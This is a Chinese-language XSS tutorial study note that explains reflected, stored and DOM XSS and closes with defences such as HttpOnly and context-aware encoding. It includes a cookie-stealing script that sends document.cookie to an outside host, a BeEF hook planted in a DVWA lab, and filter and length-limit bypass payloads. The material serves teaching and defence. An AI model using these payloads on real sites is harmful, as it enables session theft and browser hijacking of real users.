## 前言

此文章总结学习于《白帽子讲WEB安全》

跨站脚本攻击（XSS）是客户端安全的头号大敌，OWASP TOP 10多次把xss列在榜首。

## 一、XSS简述

**XSS攻击是指黑客通过“HTML注入”篡改网页，插入恶意的脚本，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。**

### 1.1 什么是XSS

假设一个用户输入的参数直接输出到页面上**（本章全程使用phpStudy进行环境部署）**

    
    
    <?php
    $input = $_GET["test"];
    echo "<div>".$input."</div>";
    ?>
    

访问此php界面，想test参数提交数据，页面会展示提交的数据内容

    
    
    http://192.168.163.131/test.php?test=ceshi
    

![image-20211027155926793](https://image.3001.net/images/20220517/1652774959_6283582f62f877a7a547f.png!small)

上面我们可以看到和我们猜想的一样。

如果我们提交的数据改为一段js代码

    
    
    http://192.168.163.131/test.php?test=<script>alert(/test!!!/)</script>
    

![image-20211027164714430](https://image.3001.net/images/20220517/1652774960_6283583058934e857cccc.png!small)

我们看到script脚本被执行，我们在看一下源代码

![image-20211027164848282](https://image.3001.net/images/20220517/1652774961_62835831169a06c251877.png!small)

    
    
    <div><script>alert(/test!!!/)</script></div>
    

script脚本被加载到页面中，这显然是有问题的。

### 1.2 XSS分类

XSS根据效果可以分为三类：

 **反射型XSS**

我们上面的例子就是反射型的xss，就是把用户输入的数据“反射”给浏览器，也就是说，用户在访问恶意链接时，才能攻击成功，反射型xss也叫做非持久性xss。

 **存储型XSS**

存储型xss会把用户输入的数据存储在服务器端，这种sxx具备很强的稳定性，常见的场景就是，黑客写下一篇包含恶意js脚本的博客，其他用户浏览包含恶意js脚本的博客，会在他们浏览器上执行这段恶意代码。包含恶意js脚本的博客是保存在服务端的，所以这种xss攻击叫做“存储型xss"

 **DOM XSS**

这类XSS非按照数据是否保存在服务的来划分的，DOM XSS与反射性XSS、存储型XSS的主要区别在于DOM
XSS的XSS代码不需要服务端解析响应的直接参与，触发XSS的是浏览器端的DOM解析。

### 1.3 DOM XSS漏洞演示

通过修改页面的DOM节点形成的xss，称之为DOM XSS

看如下代码

    
    
    <script>
    
    function test(){
    	var str = document.getElementById("test").value;
    	document.getElementById("t").innerHTML = "<a href='"+str+"' >testLink</a>";
    }
    </script>
    
    <div id="t" ></div>
    <input type="text" id="test" value="" />
    <input type="button" id="s" value="write" onclick="test()" />
    

![image-20220511160653443](https://image.3001.net/images/20220517/1652774961_62835831e1a9c59d6027b.png!small)

点击wirte会有一个超链接，其地址为文本框的内容。

这里的wirte按钮的onclick事件调用了test()函数。而在test()函数。而在test()函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作html写入到页面中，这就造成了DOM
based XSS。

构造如下数据

    
    
    ' onclick=alert(/xss/) //
    

输入之后界面代码局变成了

    
    
    <a href='' onclick=alert(/xss/) //' >testLink</a>
    

首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后用注释符“//”注释掉单引号。点击新生连接，脚本将被执行。

![](https://image.3001.net/images/20220517/1652774962_62835832b33ac0fbebec3.png!small)

实际上，这里还有另外一种利用方式，除了构造一个新事件外，还可以选择闭合掉标签，并插入一个新的HTML标签。尝试如下输入

    
    
    '><img src=# onerror=alert(/xss1/) /><'
    

页面代码变成了

    
    
    <a href=''><img src=# onerror=alert(/xss1/) /><'' >testLink</a>
    

脚本被执行

![image-20220511164214999](https://image.3001.net/images/20220517/1652774963_628358337d785099797af.png!small)

# 二、XSS攻击进阶

### 2.1 初探XSS Payload

 **XSS攻击成功后，攻击者能过对用户当前浏览的页面进行植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些以完成各种功能的恶意脚本，被称为“XSS
Payload”**

XSS Payload实际上就是javascript（flash或其他富客户端的脚本），所以在任何JavaScript脚本能实现的功能，xxs
payload都能做到。

 **2.1.1 Cookie 劫持**

cookie中一般加密保存了当前用户的登录凭证。攻击者如果获取cookie就可以不通过密码登录平台

攻击者加载一个远程脚本

    
    
    http://192.168.114.130/admin.php?time=1"><script src=http://192.168.163.128/evil.js></script>
    

真正xxs payload写在这个远程脚本中，避免直接在url中写入大量的javascript代码

 **evil.js文件**

    
    
    var img = document.createElement("img");
    img.src = "http://192.168.163.143/log?" +escape(document.cookie);
    document.body.appendChild(img);
    

这段是插入一个看不到的图片，同时把document.cookie对象当作参数发送到远程服务器。，实际上http://192.168.163.143/log不用存在，因为这个请求会在远程服务器上的web日志中记录

    
    
    tail -f /var/log/apache2/access.log
    

**2.1.2 cookie登录**

首先管理员用户登录cms测试平台

![image-20220511222724650](https://image.3001.net/images/20220517/1652774964_6283583482d341eeabff3.png!small)

F12在控制台输入

    
    
    document.cookie
    

登录test用户，使用burp拦截请求包，将cookie修改为admin用户的cookie

![image-20220511223701470](https://image.3001.net/images/20220517/1652774966_62835836535c1672faf0b.png!small)

放开拦截，我们发现test变为admin用户

![image-20220511224106280](https://image.3001.net/images/20220517/1652774968_628358383eb6e5e1ba3c9.png!small)

所以xss攻击，可以完成cookie劫持攻击。我们一般通过在cookie中增加httponly标识可以防止cookie劫持。

### 2.2 强大的XSS Payload

ciooke劫持并非所有时候都有效，有的网站可能会在set-cookie时给关键cookie植入HttpOnly标识；有些网站可能会把cookie与客户端IP绑定。从而是的xss窃取cookie失去意义。

尽管如此，在xss攻击成功后，攻击者仍然有许多方式能控制用户的浏览器

1、构造GET与POST请求

2、使用XSS钓鱼，模拟一个登录窗口等。

3、识别用户浏览器

我们可以通过xss收集一些用户个人信息，实现精准的浏览器内存攻击，最终实现给电脑注入一个木马。

    
    
    navigator.userAgent
    

![image-20220512212622571](https://image.3001.net/images/20220517/1652774969_628358397b0d643a19f56.png!small)

    
    
    OS版本信息：Windows NT 6.1; Win64; x64
    浏览器版本：Chrome 101.0.4951.64
    

但是这个useragent信息是可以伪造的，所以通过javascript取出来的这个信息不一定正确。

4、识别用户安装的软件

知道用户的浏览器、操作系统后，进一步识别用户安装的软件。

5、CSS History Hack

其原理市利用style的visited属性，如果用户曾经访问某个连接，那么这个链接的颜色会变得与众不同。

    
    
    <body>
    	<a href=# > 曾经访问过的 </a>
    	<a href="notexist">未曾访问过的</a>
    </body>
    

![image-20220513152529653](https://image.3001.net/images/20220517/1652774970_6283583a9975484964988.png!small)

6、获取用户的真实IP地址

### 2.3 XSS攻击平台

 **xss payload如此强大，为了方便，安全研究者将许多功能封装起来，成为xss攻击平台。**

 **AttackApi**
是一个用于XSS攻击的JS库，你不用再写那些繁琐的涉及到各种标签各种dom各种系统各种浏览器的基础代码，直接调用AttackAPI为你封装好的那些函数即可。

 **2.3.1 Beefxss工具演示**

 **工具介绍**

BeEF-XSS是一款非常强大的web框架攻击平台，集成了许多payload，可以实现许多功能。

    
    
    BeEF-XSS生成交互paylaod的hook
    服务器端：beef作为服务端管理，管理访问运行了hook的客户端
    客户端：运行与客户端浏览器的 Javascript 脚本（hook），也就是beef生成的payload。
    beef将运行了hook的web浏览器钩住，进行管理
    

beef能配合xss，将hook插入到存在xss的注入处；直接诱使客户端访问含有 hook 的伪造站点，结合中间人攻击注入 hook 脚本

 **工具下载**

beef只支持Linux平台，Ruby的版本需要在2.5以上，kali中自带beef

下载：`git clone https://github.com/beefproject/beef`

安装配置查看：`https://github.com/beefproject/beef/wiki/Installation`

beef如果用于实战的话，需要建立连接的时候要使受害机能访问到beef，因此需要一个公网ip。

 **使用测试**

kali攻击者：192.168.163.128

DVWA靶机：192.168.163.131

1、更该beef的默认用户名密码

    
    
    vi /etc/beef-xss/config.yaml
    

beef的默认用户名密码为beef、beef，如果需要更改beef的用户密码，则在配置文件里面更改user和passwd的值,（默认是修改密码的，不然启动的时候会报警告）。

![image-20220513161354333](https://image.3001.net/images/20220517/1652774979_628358431b5ad8a067d59.png!small)

启动beef服务端

    
    
    beef-xss
    

![image-20220513161500184](https://image.3001.net/images/20220517/1652774980_628358449499f8c5252b6.png!small)

beef的服务端地址，用户密码为默认的beef，密码为你自己修改之后的密码

    
    
    http://127.0.0.1:3000/ui/panel
    

![image-20220513161544720](https://image.3001.net/images/20220517/1652774982_6283584620a47aa742ebc.png!small)

登录成功后，这里会显示在线和不在线的主机，在线就是现在该主机浏览器执行了我们的js脚本代码，不在线的就是该主机曾经执行过我们的js脚本代码，但现在关掉了该界面。

![image-20220513161919030](https://image.3001.net/images/20220517/1652774983_62835847c2b1657917df5.png!small)

 **插入脚本hook到靶机**

我们的hook启动的时候已经给出：

    
    
    [*]  Web UI: http://127.0.0.1:3000/ui/panel
    [*]    Hook: <script src="http://<IP>:3000/hook.js"></script>
    [*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>
    

![image-20220513162102114](https://image.3001.net/images/20220517/1652774985_62835849e536448ecde9f.png!small)

kali的地址为192.168.163.128，那么靶机上插入的hook js脚本为：

    
    
    <script src="http://192.168.163.128:3000/hook.js"></script>
    

在靶机DVWA，把"DVWA security"等级改成"low",然后打开"XSS
stored",把我们的脚本代码存储起来。这样就形成了一个存储型XSS，当受害者(windows 7)浏览该页面时，就被劫持了。

![image-20220513162426377](https://image.3001.net/images/20220517/1652774987_6283584ba15ccbbf676a9.png!small)

留言提交后，靶机的浏览器就被beef钩上了：

![image-20220513162602751](https://image.3001.net/images/20220517/1652774989_6283584d7011a67c537e6.png!small)

 **beef管理**

在beef上钩了的受害机，beef对其可以获取很多主机、浏览器信息

1、Details是浏览器信息详情

![image-20220513162731402](https://image.3001.net/images/20220517/1652774991_6283584fb45886d7ed92e.png!small)

2、logs模块-日志记录

![image-20220513162850455](https://image.3001.net/images/20220517/1652774994_628358529165a985c405c.png!small)

3、commands-命令模块

![image-20220513162959808](https://image.3001.net/images/20220517/1652774995_62835853e100d5e9afd52.png!small)

主要模块

    
    
    -Browsers（浏览器）
    - Exploits（攻击）
    - Host（主机）
    - Persistence（持久）
    - Network（网络）
    

绿色圆圈：表示模块适合目标浏览器，并且执行结果对客户端不可见

红色圆圈：表示模块不适用与当前用户，有些红色模块也可以正常执行

橙色圆圈：模块可用，但结果对用户可见（CAM 弹窗申请权限）

灰色圆圈：模块未在目标浏览器上测试过

![image-20220513163057563](https://image.3001.net/images/20220517/1652774997_628358559bbacb6ace2e9.png!small)

 **XSS-Proxy**

是一个轻量级的XSS攻击平台，通过嵌套iframe的方式可以实时地远程控制被XSS攻击的浏览器

### 2.4 XSS Worm

一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发生xss worn攻击。比如：用户留言，个人信息等

### 2.5 XSS构造技巧

 **2.5.1 利用字符编码**

在使用GB2312编码的网页上，script标签输出一个变量，提交输入的是 “；alert(/xss/)” 来实现xss攻击，使用 "
来闭合前面的符号，但是页面转义了双引号，所以实际代码如下：

    
    
    let redirectUrl = "\";alert(/xss/);";
    

正常情况下这样是没发引起xss的，因为变量处于双引号之内，系统转义了双引号。

但在使用GB2312编码页面中， “%c1\”两个字符组合在一起会成为一个unicode字符，于是可以构造输入

    
    
    let redirectUrl = "%c1\";alert(/xss)";
    

提交之后，通过GB2312编码转义就会变成

    
    
    let redirectUrl = "繺";alert(/xss/);
    

刚好把“\”给覆盖掉。

"%c1" 这两个字符组成一个新的unicode字符，"%c1" 把转义符"\“ 给吃掉了，从而绕过了系统的安全检查。

 **2.5.2 绕过长度限制**

很多时候，产生xss的地方会有变量的长度限制，这个限制可能是服务器端逻辑造成的，假设下面代码存在一个xss漏洞

    
    
    <input type=test value="$var" />
    

服务器如果对输入变量”$var“ 做了严格的长度限制，那么攻击者可能会这样xss

    
    
    $var为： "><script>alert(/xss/)</script>
    

希望达到的输入效果是

    
    
    <input type=test value=""><script>alert(/xss/)</script> />
    

假设长度限制为20个字符，则这段xss会被切割为

    
    
    $var 输入为："><script>alert(/xss
    

连一个完整的函数都无法写完，这样就xss就可能无法成功了。

但是攻击者可以利用事件来缩短所需要的字符数

    
    
    $var 输出为：" onclick=alert(1)//
    

加上空格符正好20个字符，实际输出为

    
    
    <input type=test value="" onclick=alert(1)//" />
    

当用户点击文本框后，alert执行

![image-20220513231326717](https://image.3001.net/images/20220517/1652774998_62835856ed59d0d795179.png!small)

利用事件能够缩短的字节数是有限的，最好的办法就是把xss payload写到别处，在通过简短的代码加载这段xss payload

通常的一个藏代码的地方就是
location.hash。而且跟进http协议，location.hash的内容不会在http包中发送，所以服务端web日志中不会记录location.hash里的内容。

 **注：hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。**

    
    
    $var 输出为：" onclick="eval(location.hash.substr(1))
    

总40个字节。输出后的html是：

    
    
    <input type=test value="" onclick="eval(location.hash.substr(1))" />
    

因为location.hash的第一个字符是#，substr(1)是从1开始，不是从0开始，，此时构造出来的url为

    
    
    http://127.0.0.1/1.html#alert(1)
    

![image-20220514010140345](https://image.3001.net/images/20220517/1652774999_62835857c17b71811713c.png!small)

location,hash本身没有长度限制，但浏览器的地址栏有长度限制，如果地址栏长度不够用，还可以使用加载远程js的方法。

 **2.5.3 注释符绕过长度限制**

比如我们可能控制两个文本框，第二个文本框允许我们写入更多字节。我们可以通过注释符号把两个文本框之间的HTML代码全部注释掉，从而打通两个标签。

    
    
    <input id=1 type="text" value="" />
    xxxxxxxxxxxxxxx
    <input id=2 type="text" value="" />
    

在第一个input框中输入

    
    
    "><!--    

在第二个input框中输入

    
    
    --><script>alert(/xx/)</script>
    

最终效果

    
    
    <input id=1 type="text" value=""><!--" />
    xxxxxxxxxxxxxxx
    <input id=2 type="text" value="--><script>alert(/xx/)</script>" />
    

中间代码全部被注释

    
    
    <!--" />
    xxxxxxxxxxxxxxx
    <input id=2 type="text" value="-->
    

最终效果如下

![image-20220514011434836](https://image.3001.net/images/20220517/1652775000_62835858b302b690fe242.png!small)

 **2.5.4 使用 < base>标签**

< base>标签并不常用，作用是定义界面上的一个所有相对路径 标签的hosting地址。

比如，打开一张不存在的图片

    
    
    <body>
    <img src="/test/1.png">
    </body>
    

![image-20220514112918630](https://image.3001.net/images/20220517/1652775001_628358597243ebd4401ef.png!small)

实际上这个地址是一张图片，源地址

    
    
    http://127.0.0.1/test/1.png
    

![image-20220514113528083](https://image.3001.net/images/20220517/1652775002_6283585acf6ef04fb7a91.png!small)

在img标签前面添加一个base标签

    
    
    <body>
    <base href="http://127.0.0.1" />
    <img src="/test/1.png">
    </body>
    

![image-20220514113558541](https://image.3001.net/images/20220517/1652775005_6283585d04b3bcc172b79.png!small)

base标签可以出现在页面的任何地方，并作用于位于该标签之后的所以标签。

如果攻击者在页面插入了base标签，就可以通过远程服务器伪造图片，连接或者脚本。劫持当前页面中所有使用相对路径的标签。比如：

    
    
    <base href="http://www.a.com" />
    
    <img src="/test/1.png">
    
    <script src="x.js"></script>
    
    <a href="auth.do">auth</a>
    

所以涉及xss安全方案一定要过滤掉这个非常危险的标签。

 **2.5.5 window.name 的妙用**

对当前窗口的window.name对象赋值，没有特殊字符的限制。因为window对象是浏览器的窗体，而非document对象，因此很多时候，windwo对象不受同源策略的限制。攻击者利用这个对象可以实现跨域、跨界面传递数据。在某些环境下，这些特性将会变得非常有用。

假设“http://192.168.114.130/1.html”的代码为

    
    
    <body>
    <script>
    window.name = "test"
    alert(document.domain+"	"+window.name)
    window.location = "http://192.168.163.128/index.html"
    </script>
    </body>
    

这段代码将window.name赋值为test,然后显示当前域和window.name的值，最后将其页面跳转到“http://192.168.163.128/index.html”。

“http://192.168.163.128/index.html”的代码为

    
    
    <body>
    <script>
    alert(document.domain+"	"+window.name)
    </script>
    </body>
    

我们访问“http://192.168.114.130/1.html”，这里显示了当前域和windows.name值

![image-20220514120401567](https://image.3001.net/images/20220517/1652775007_6283585f0a8bca8a8f556.png!small)

点击确定后，页面自动跳转到“http://192.168.163.128/index.html”，但是winsow.name值没变

![image-20220514120700734](https://image.3001.net/images/20220517/1652775007_6283585fc8644b74bbce9.png!small)

这个过程实现了数据跨域传递：test这个值从http://192.168.114.130传递到了http://192.168.163.128。

使用windo.name可以缩短xss
payload的长度。先通过window.name写好alert（”hello“）之类的语句，再在同一窗口打开XSS站点后，输入 eval(name);

### 2.6 反射型XSS利用技巧-回旋镖

将要利用的反射型XSS嵌入到一个存储型XSS中，这个攻击技巧称为回旋镖。

因为浏览器同源策略的原因，xss也受到同源策略的限制，发生在A域的xss很难影响到B域的用户。

回旋镖的思路：如果在B域上存在一个反射型”xss_b“,在A域上存在一个存储型”xss-a"，当用户访问A域的“xss-a"时，同时嵌入B域上的"xss-b",则可以达到在A域的xss攻击B域用户的目的。

IE浏览器中，< iframe>、< img>、<
link>等标签都会拦截第三方cookie的发送。而在firefox中则无这限制（第三方cookie既指保存在本地的cookie，也就是服务器设置了expire（失效日期）时间的cookie。

所以在firefox中只需要在XSS-A处嵌入一个iframe标签即可

    
    
    <iframe src="http://www.b.com/?xss......"></iframe>
    

而在IE浏览器中，使用< form>表单，然后提交到B，B再跳转会A；

### 2.7 Flash XSS

前面说的都是基于HTML的xss，其实Flash中同样可能造成xss攻击。

在Flash中是可以嵌入ActionScript脚本的，常见的Flash xss可以这样写

    
    
    getURL("javascript:alert(document.cookie)")
    

ActionScript可以发起网络连接，因此应该禁止用户能够上传或者加载自定义Flash文件。

一定要使用Flash，如果是视频文件，要求转码为”flv“文件，flv是静态文件，不会产生隐患。如果是带动态脚本的Flash，则可以通过Flash参数进行限制。

限制Flash动态脚本的最重要参数是”allowScriptAcccess“,这个参数定义了Flash能否域HTML页面通信，他有三个可选值：

always : 对于HTML的通信也就是执行JavaScript不做任何限制。

sameDomain: 只允许来自于本域的Flash于HTML通信，这是默认值。

never: 绝对禁止Flash与页面通信。

除了allowScriptAccess外，allowNetworking也是非常关键，这个参数可以控制Flash与外部网络通信，他有三个可选值：

all : 允许使用所有网络通信，默认值

internal ： Flash不能与浏览器通信如nacigateToURL，但是可以调用其他的API

none : 禁止任何的网络通信

### 2.8 JavaScript开放框架

jQuery可能是目前最流行的javaScript框架。jQuery中有一个html()方法，这个方法如果没有参数，就是一个读取DOM节点的innerHTML，如果有参数，则会把参数写入该DOM节点的inner
HTML中，这个过程可能产生” DOM Based XSS"

    
    
    $('div.demo-container').html("<img src=# onerror=alert(1) />");
    

如上，如果用户能够控制输入，必然存在xss。

## 三、XSS防御

xss的防御是复杂的

流行浏览器都内置了一些对抗xss的措施，比如Firefox的CSP、Noscript扩展，IE8内置的XSS
Filter等。而对于网站来说，也应该有保护用户不被xss攻击的能力。

### 3.1 HttpOnly

**HttpOnly最早是由微软提出，并在IE6实现，逐步称为一个标准，浏览器将禁止页面的javascript访问带有HttpOnly属性的cookie。**

其中IE6+、firefo、chrome很多浏览器现在都具备了。

严格地说HttpOnly并非为了对抗XSS，HttpOnly解决的是XSS后的Cookie劫持攻击。

前面我们显示过cookie劫持后。可以登录被劫持后的xss用户。如果该cookie设置了HttpOnly，这种攻击就会失败，因为JavaScript取不到cookie的值。

 **一个cookie的使用过程如下：**

 **step1: 浏览器向服务器发起请求，这时候没有cookie。**

 **step2 : 服务器返回时发送set-cookie，向客户端浏览器写入cookie。**

 **step3: 在该cookie到前期，浏览器访问该域下的所有界面，都将发送该cookie。**

HttpOnly是在set-cookie时标记的

    
    
    set-cookie:<name>=<value>......[; secure] [; HttpOnly]
    

服务器可能会设置多个cookie(对应key-value对)，而HttpOnly可以选择性的添加任何一个cookie值上。

某些时候，应用可能需要javaScript访问某几项cookie，这种cookie可以不设置HttpOnly标签，而仅把HttpOnly标记用于认证的关键cookie。

 **HttpOnly的使用非常灵活，如下是一个使用HttpOnly的过程**

    
    
    <?php
    
    header("Set-Cookie: cookie1=test1;");
    header("Set-Cookie: cookie2=test2;httponly", false);
    
    ?>
    
    <script>
    	alert(document.cookie);
    </script>
    

在这段代码中，cookie1没有httponly，cookie2被标记为HttpOnly。我们查看请求包

![image.png](https://image.3001.net/images/20220525/1653469636_628df1c41065916d43ade.png!small)

浏览器的确接收了两个cookie

![image.png](https://image.3001.net/images/20220525/1653469644_628df1cc09076cd69373e.png!small)

但是只有cookie1被JavaScript读取到

![image.png](https://image.3001.net/images/20220525/1653469649_628df1d1ceaf191a65da6.png!small)

添加了HttpOnly不等于解决了xss问题，xss攻击还有窃取用户信息，模拟用户身份执行操作等。

### 3.2 输入检查

常见的web漏洞如XSS、SQL注入等，都是要求攻击者构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所以就有了检查的必要。

输入检查的代码一定要在服务器端实现，因为如果在客户端使用JavaScript进行输入检查，很容易绕过检查。正常做法是客户端和服务端实现相同的输入检查，客户端可以阻挡大部分错误操作的正常用户，可以节约服务器的资源。

输入检查一般都是检查用户输入的数据中是否包含一些特殊字符，如<，#等，比较智能的，还会匹配xss的特则，如JavaScript，< img>等敏感字符。

这种输入检查方式可以称为“XSS Filter",互联网上很多开源的“XSS Filter"源码。

XSS Filter在用户提交数据时获取变量，并进行xss检查。但此时用户数据并没有结合渲染界面的html，因此XSS Filter对语境的理解并不完整。

如下：

    
    
    <script src="$var"></script>
    

$vat就是用户可以控制的变量，用户只要提交一个恶意脚本所在的uel地址，就可以试试xss攻击了。

所以XSS Filter对语境的理解并不完整，很可能改变用户原来的意思。

### 3.3 输出检查

一般来说出来富文本的输出外，在变量输出到html页面时，可以使用编码或者转义方式来防御xss攻击。

 **3.3.1 安全的编码函数**

编码分为很多种，针对HTML代码的编码方式为HTMLEncode。

HTMLEndo并非专用名词，他只是一种函数实现，他的作用是将字符转换成HTMLEntities，对应的标准是ISO-8859-1。

为了对抗xss,在HTMLEncode中要求至少转化一下字符：

    
    
    &	- 	&ampamp
    <	-	&amplt
    >	-	&ampgt
    "	-	&ampquot
    '	-	'
    /	-	/
    

在php中，有htmlentities()和htmlspecialchars()两个函数可以满足安全要求。

JavaScript的编码方式可以使用JavaScriptEncode。

JavaScriptEncode需要使用 \ 对特殊字符进行转义。在对抗xss时候，还要去输出变量必须在引号内部。

    
    
    var x = escapeJavascript($evil);
    var y = '"'+escapeJavascript($evil)+'"';
    

如果escapeJavascript()函数只转义了几个危险的字符，比如‘ 、“、<、>等，那么上面两行代码输出后可能会变成

    
    
    var x = 1;alert(2);
    var y = "1;alert(2)";
    

第一行执行额外的代码了，第二行是安全的，对于后者，攻击者即使向逃逸出引号的范围，也会遇到困难。

    
    
    var y = "\";alert(1);\/\/";
    

所以要求使用JavaScriptEncode的变量出输出一定要去引号内。

还有一个更加严格的JavaScriptEncode函数来保证安全-除了数字、字母外的所有字符，都使用十六进制“\xHH"方式进行编码，如下

    
    
    var x = 1;alert(2);
    

变成了

    
    
    var x = 1\x3balert\x2822\x29;
    

除了以上函数，还有其他函数，比如：XMLEncode(其实现与HtmlEncode类似)、JSONEncode(与JavaScriptEnde类似)等。

 **3.3.2 只需要一种编码吗**

XSS攻击主要发生在MVC架构中的View层。大部分的XSS漏洞可以在模板系统中解决。

python开放框架Django自带的模板系统“Django Templates"中，可以使用escape进行HtmlEncode。比如：

    
    
    {{var|escape}}
    

这样写变量会被HtmlEncode编码。

在Django1.0、web2py框架中加强，默认所有变量都会被escape。符合“Secure By Default”原则。

因为语境不同，不是全部都使用auto-escape就可以，需要根据情况分情况对待。

**注：经典MVC模式中，M是指业务模型，V是指用户界面，C则是控制器，使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表现形式。其中，View的定义比较清晰，就是用户界面。**

### 3.4 正确地防御XSS

XSS本质是一种HTML注入，用户的数据被当作HTML代码的一部分，从而混淆原来的语义，产生新的语义。

如果网站时MVC架构，那么XSS就发生在View层，在应用拼接变量到HTML页面时产生。所以在提交数据处进行输入检查的方案，其实并不是在真正发生攻击的地方做防御。

我们尝试将不同场景的xss一一列出，尝试解决

下面变量$var 表示用户数据。

 **3.4.1 在HTML标签中输出**

    
    
    <div>$var</div>
    <a href=#>$var</a>
    

所有在标签中输出的变量，如果未做任何处理，都能导致直接产生XSS。

此场景下，XSS的利用方式一般都是构造一个< script>标签，或者是任何能够产生脚本执行的方式。

    
    
    <div><script>alert(/xss/)</script></div>
    

或

    
    
    <a href=#><img src=# onerror=alert(1) /></a>
    

**防御方法**

对变量使用HtmlEncode。

 **3.4.2 在HTML属性中输出**

    
    
    <div id="abc" name="$var" ></div>
    

与在HTML标签中输出类似，可能的攻击方法

    
    
    <div id="abc" name=""><script>alert(/xss/)</script><"" ></div>
    

**防御方法**

对变量使用HtmlEncode。

 **3.4.3 在script标签中输出**

在script标签中输出时，首先应该确保输出的变量在引号中

    
    
    <script>
    var x = "$var";
    </script>
    

攻击者需要先闭合引号才能试试xss攻击

    
    
    <script>
    var x = "”alert(/xss/);//";
    </script>
    

**防御方法**

对变量使用JavascriptEncode。

 **3.4.4 在事件中输出**

在事件中输出和在< script>标签中输出类似

    
    
    <a href=# onclick="funcA('$var')">test</a>
    

可能的攻击方法

    
    
    <a href=# onclick="funcA('');alert(/xss/);//')">test</a>
    

**防御方法**

对变量使用JavascriptEncode。

 **3.4.5 在css中输出**

在CSS和style、style attribute中形成的xss方式非常多样化。

 **防御方法**

尽可能禁止用户可控制的变量在< style>标签、HTML标签的style属性以及CSS文件中输出。如果一定有这种需求，则推荐使用OWASP
ESAPI中的encodeForCSS函数，此函数除了字母、数字外的所有字符都被编码成为十六进制形式“\uHH”。

 **3.4.6 在地址中输出**

在URL的path（路径）或者search(参数)中输出使用urlEncode即可。URLEncode会将字符转化为%HH形式，比空格就是“%20”等。

    
    
    <a href="http://www.a.com/?test=$var">test</a>
    

可能的攻击方法

    
    
    <a href="http://www.a.com/?test=" onclick=alert(1)"" >test</a>
    

经过URLEncode编码后

    
    
    <a href="http://www.a.com/?test=%22%20onclick%3Dalert(1)%22" >test</a>
    

还有一种是url的http://(protocal部分)和IP地址（host部分）不能使用urlEncode转发的情况

攻击者伪造协议实施攻击

    
    
    <a href="JavaScript:alert(1)">test</a>
    

还有vbscript、dataURL等伪协议可能导致脚本执行。

 **防御方法**

这种情况下如果变量是整改url,则先检查变量是否以http开头，保障不会出现伪协议的xss攻击。在对变量进行URLEncode。

### 3.5 处理富文本

部分网站允许用户提交一些自定义的HTML代码，称为富文本。

富文本，应严格禁止< iframe>、< script>等标签，只允许< a>、< img>等比较安全的标签，在标签选择上，应该使用白名单、避免使用黑名单。

富文本在处理CSS时，尽可能的禁止用户自定义css与style。

有些开源的XSS Filter项目，可以实现对富文本的xss检查。

### 3.6 防御DOM Based XSS

DOM Based XSS是一种比较特殊的xss漏洞，前文中提到的几种防御方法都不太合适，需要特别对待

我们看一下之前的例子，看一下DOM Based XSS是如何形成的呢

    
    
    <script>
    
    function test(){
    	var str = document.getElementById("test").value;
    	document.getElementById("t").innerHTML = "<a href='"+str+"' >testLink</a>";
    }
    </script>
    
    <div id="t" ></div>
    <input type="text" id="test" value="" />
    <input type="button" id="s" value="write" onclick="test()" />
    

在上面代码onclick事件中，执行了test()函数，而函数中最关键的一句是

    
    
    document.getElementById("t").innerHTML = "<a href='"+str+"' >testLink</a>";
    

将HTML代码写入DOM节点，最后导致xss的发生

事实上，DOM Based
XSS是从JavaScript中输出数据到HTML页面里，而前文提到的方法都是针对“从服务器应用直接输出到HTML页面”的XSS漏洞，因此不适用DOM
Based XSS。

看一下这个例子

    
    
    <script>
    	var x = "$var";
    	document.write("<a href='"+x+"'>test</a>");
    </script>
    

变量$var在script标签内，可是最后又被document.write输出到HTML界面中。

假设为了保护$var，直接在script标签内产生xss，服务器对其进行javascEscape。可是，$var在document.write时，然仍然能够产生xss

    
    
    <script>
    	var x = "\x20\x27onclick\x3dalert\x281\x29\x3b\x2f\x2f\x27";
    	document.write("<a href='"+x+"'>test</a>");
    </script>
    

![image.png](https://image.3001.net/images/20220525/1653469682_628df1f27621522ef027d.png!small)

通过javascEscape编译，但通过HTML界面渲染后，恶意代码又被识别出来

其原因，第一次执行JavaScriptEscape后，只保护了

    
    
    var x = "$var";
    

但是当document.write输出数据到html页面时，浏览器渲染了界面，在<
script>标签执行时，已经对变量x进行了界面，在document.write在运行时，其参数变成了

    
    
    document.write("<a href=' 'onclick=alert(1);//''>test</a>");
    

XSS因此产生。

那是不是对$var函数用错了编码方式，我们使用htmlEncode，将 Html 源文件中不允许出现的字符进行编码。例如："<"、">"、"&" 等。

    
    
    <script>
    	var x = "&#x31;&#x22;&#x29;&#x3b;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x22;&#x32;&#x22;&#x29;&#x3b;&#x2f;&#x2f;&#x22;&#x22;";
    	document.write("<a href=# onclick='alert(\""+x+"\")' >test</a>");
    </script>
    

![image.png](https://image.3001.net/images/20220525/1653469690_628df1fa6d63590b3a407.png!small)

**防御方法**

在$var输出到<
script>标签时，应该执行一次JavaScriptEncode，其次在document.write输出到HTML页面时，要分具体情况看待：如果是输出到事件或者脚本，则再做一次JavaScriptEncode，如果是输出到HTML内容或者属性，则要做一次HtmlEncode。也就是说从JavaScript输出到HTML页面，也等于一次xss输出的过程，需要分语境使用不同的编码。

会触发DOM Based XSS的地方很多，下面是JavaScript输出到HTML页面的必经之路

    
    
    document.write()
    document.writeln()
    xxx.innerHTML=
    xxx.outerHTML=
    innerHTML.replace
    document.attachEvent()
    window.attachEvent()
    document.location.replace()
    document.location.assign()
    ......
    

除了服务器端直接输出变量到JavaScript外，还有以下几个地方可能会成为DOM Based XSS的输入点。

    
    
    页面中所有inputs框
    window.location(href、hash等)
    window.name
    document.referrer
    document.cookie
    localstorage
    XMLHttpRequest返回的数据
    ......
    

## 四、总结

本章从主要是从认识xss、xss
payload、xss构造技巧和xss防御方法详细讲述了三类（反射型、存储型、DOM型）XSS漏洞。一般来说存储型的威胁最大，因为可能会跨页面存在也反射型和DOM则需要攻击者诱使用户点击一个包含xss代码的URL连接。理论上，xss漏洞虽然复杂，但却是可以彻底解决的。需要针对不同场景使用不同的防御方法。

